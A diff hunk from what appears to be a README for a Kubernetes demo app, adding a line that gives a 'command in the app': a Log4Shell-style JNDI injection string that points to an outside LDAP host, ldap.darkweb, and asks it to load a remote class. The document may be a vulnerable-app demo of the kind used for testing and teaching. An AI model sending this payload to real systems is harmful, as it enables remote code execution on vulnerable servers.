@@ -45,3 +45,7 @@ Run the `/.k8s-quickstop.sh` script at the top level of this repo which will do 
    **Note:** This will not delete any additional objects you may have deployed such as NetworkPolicies.
 
 It is up to you to shut down your Kubernetes cluster as appropriate.
+
+
+Command in the app:
+`${jndi:ldap://ldap.darkweb:80/#Vandalize}`
